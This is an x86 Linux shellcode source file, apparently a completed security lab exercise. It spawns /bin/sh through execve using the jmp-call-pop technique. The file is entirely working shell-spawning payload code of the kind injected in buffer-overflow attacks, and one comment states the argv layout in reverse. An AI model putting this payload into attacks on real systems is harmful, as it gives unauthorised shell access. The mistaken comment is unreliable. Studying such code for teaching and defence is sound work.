section .text
global _start
_start:
        jmp two
one:
        pop esi                 ; esi now holds address of the string "/bin/sh*AAAABBBB"
        mov ebx, esi		; (complete) ebx should contain the string address
	mov eax, 0
        mov byte [ebx+7], 0x00  ; (complete) terminate /bin/sh with 0x00 (1 byte)
                                ; ebx now holds the address of the string "/bin/sh"

        ; start to construct the array argv[]
        mov [ebx+8], ebx   	; (complete) save ebx to memory at address ebx+8
                                ; replace AAAA with the address of string "/bin/sh"
        mov [ebx+12], eax  	; (complete) save eax to memory at address ebx+12
                                ; replace BBBB with NULL bytes
        lea ecx, [ebx+8]   	; let ecx = ebx + 8
                                ; now ecx points to the array argv[]
                                ; argv[0] = NULL
                                ; argv[1] = the address of string "/bin/sh"
        
        ; For environment variable 
	mov edx, 0              ; No env variables

        ; Call execve()
        mov al, 0x0b            ; eax = 0x0000000b
        int 0x80
two:
        call one                ; now address of string '/bin/sh*AAAABBBB' is on the stack
        db '/bin/sh*AAAABBBB'   